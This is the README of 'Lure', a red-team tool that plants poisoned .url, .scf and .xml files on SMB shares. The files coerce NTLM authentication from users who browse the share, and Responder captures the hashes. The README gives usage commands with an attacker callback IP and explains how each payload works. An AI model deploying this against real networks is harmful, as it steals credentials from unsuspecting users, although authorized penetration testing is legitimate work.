<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-light.svg">
  <img alt="Lure" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Lure/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Python](https://img.shields.io/badge/language-Python-3776AB.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**SMB hash bait for authorized red team engagements.**

Drops poisoned `.url`, `.scf`, and `.xml` files onto writable SMB shares to coerce NTLM authentication from any user that browses the share. Captured hashes feed straight into Responder for offline cracking or relay. Catppuccin Mocha terminal output.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

```bash
# pipx (recommended)
pipx install git+https://github.com/Real-Fruit-Snacks/Lure.git

# Or standard pip
pip install git+https://github.com/Real-Fruit-Snacks/Lure.git
```

```bash
# Drop a .scf file on an open share and start Responder
sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s public -p scf

# Authenticated upload to a domain share, prompting for the password
sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 \
    -s shares -u CORP/jdoe --ask-pass

# Drop all three (default) into a nested subdirectory
sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 \
    -s shares -d HR/public

# After the engagement: remove the payloads from the share
sudo lure clean -t 10.10.10.5 -s public
```

> `lure` requires `smbclient` and `responder` on `$PATH`. On Kali: `sudo apt install smbclient responder`.

> **Upgrading from v1.x?** The flat `lure -r ... -l ... -A` interface is gone. Run `lure --help` for the four new subcommands. See [CHANGELOG.md](CHANGELOG.md) for the full rename table.

---

## Features

### Three Payload Types

Generates three proven hash-coercion payloads, each abusing a different Windows auto-resolve behavior:

| File | Mechanism | Trigger |
|------|-----------|---------|
| `@lure.url` | `IconFile` UNC → forces icon resolution | Explorer opens the share |
| `@lure.scf` | Shell command link with UNC `IconFile` | Explorer opens the share |
| `@lure.xml` | `xml-stylesheet` PI pointing at a remote XSL | Word opens the document |

The `@` prefix sorts the files to the top of the directory listing, maximizing the chance a curious user browses them first.

### Drop and Listen

`lure drop` handles the full workflow in one command: generates the payloads, uses `smbclient` to upload them to the target share (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface to catch the inbound authentication. Pass `--no-listen` to drop only, or use `lure listen -i IFACE` to start Responder separately.

### Subdirectory Targeting

When the share root is read-only but a subdirectory is writable, `-d <path>` uploads the payload directly into the nested location without requiring a separate mount.

### Flexible Authentication

`-u/--user` accepts every form operators tend to type: `user`, `DOMAIN/user`, `DOMAIN\user`, or `user@DOMAIN.LOCAL`. The domain is parsed out automatically — no separate `--domain` flag.

Passwords have three sources, in order of preference: `--ask-pass` (interactive prompt with no echo), `$LURE_PASSWORD` (environment variable), or `--pass <value>` (visible in `ps`).

### Cleanup and Dry-Run

`lure clean` removes payloads from a share after the engagement. Every subcommand also accepts `--dry-run`, which prints the exact `smbclient` invocation (shell-quoted, copy-pasteable) without writing or uploading anything — handy for sanity-checking commands or planning on a workstation that doesn't have `smbclient` installed.

### Water-Themed Terminal Output

Catppuccin Mocha palette — Teal, Sky, Sapphire, Blue, Lavender — applied via 24-bit ANSI escapes. Status messages use green / yellow / red semantics for success / progress / error. Honors `--no-color` and the `$NO_COLOR` env var.

---

## Command Reference

```
lure <command> [options]

Commands:
  drop      Drop bait files onto a share and (optionally) start Responder
  clean     Remove previously dropped bait from a share
  listen    Start Responder only (no upload)
  list      Enumerate shares on a target via 'smbclient -L'

Global:
  -V, --version    Print version and exit
  --no-color       Disable color output (also honors $NO_COLOR)
```

### `lure drop`

| Flag | Description |
|------|-------------|
| `-t`, `--target <ip>` | Target SMB server *(required)* |
| `-s`, `--share <name>` | Target share name *(required)* |
| `-c`, `--callback <ip>` | Attacker IP embedded in payload UNC paths *(required)* |
| `-i`, `--iface <iface>` | Network interface for Responder *(required unless `--no-listen` or `--dry-run`)* |
| `-d`, `--dir <path>` | Subdirectory inside the share |
| `-p`, `--payload <type>` | `url`, `scf`, `xml`, or `all` (repeatable; default: all three) |
| `--name <base>` | Custom payload basename (default: `@lure`) |
| `--no-listen` | Drop only — skip the Responder handoff |
| `--dry-run` | Print the `smbclient` command without writing or uploading |
| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
| `--pass <pass>` | Password (visible in `ps`) |
| `--ask-pass` | Prompt for the password interactively |

### `lure clean`

| Flag | Description |
|------|-------------|
| `-t`, `--target <ip>` | Target SMB server *(required)* |
| `-s`, `--share <name>` | Target share name *(required)* |
| `-d`, `--dir <path>` | Subdirectory inside the share |
| `-p`, `--payload <type>` | Which payloads to remove (repeatable; default: all three) |
| `--name <base>` | Match payloads with this basename (default: `@lure`) |
| `--dry-run` | Print the `smbclient` command without deleting |
| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
| `--pass <pass>` | Password |
| `--ask-pass` | Prompt for the password |

### `lure listen`

| Flag | Description |
|------|-------------|
| `-i`, `--iface <iface>` | Network interface for Responder *(required)* |

### `lure list`

| Flag | Description |
|------|-------------|
| `-t`, `--target <ip>` | Target SMB server *(required)* |
| `--dry-run` | Print the `smbclient -L` command without invoking it |
| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
| `--pass <pass>` | Password |
| `--ask-pass` | Prompt for the password |

### Authentication

`-u/--user` accepts any of these forms — the domain is parsed automatically:

| Form | Parsed as |
|------|-----------|
| `jdoe` | user only, no domain |
| `CORP/jdoe` | domain `CORP`, user `jdoe` |
| `CORP\jdoe` | domain `CORP`, user `jdoe` |
| `jdoe@corp.local` | domain `corp.local`, user `jdoe` |

Password resolution order: `--pass <value>` > `$LURE_PASSWORD` env var > `--ask-pass` prompt.

### Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Success |
| `2` | Invalid argument combination (e.g. username without password, missing required flag) |
| `4` | Prerequisite missing (`smbclient` or `responder` not on `$PATH`) |
| other | Propagated from `smbclient` |

---

## Platform Support

| Capability | Linux | macOS | Windows |
|------------|-------|-------|---------|
| Payload generation | Full | Full | Full |
| `smbclient` upload | Full | Full (via Homebrew) | WSL only |
| Responder handoff | Full | -- | WSL only |
| Color output | Full | Full | Full (Windows Terminal) |

Lure is built for the standard Kali attacker workstation. `smbclient` and Responder are assumed to be on `$PATH`.

---

## Security

Report vulnerabilities via GitHub Security Advisories. Do not open public issues for security concerns.

Lure is an **authenticated-user coercion tool**, not a vulnerability scanner. It does **not**:

- Exploit memory-corruption bugs
- Bypass authentication or elevate privileges directly
- Generate long-lived implants or beaconing
- Target hosts outside the engagement scope you provide

Hash capture requires Responder (or your listener of choice) on a network path the target can reach. Nothing happens until a user with credentials interacts with the shared directory.

---

## License

[MIT](LICENSE) -- Copyright 2026 Real-Fruit-Snacks
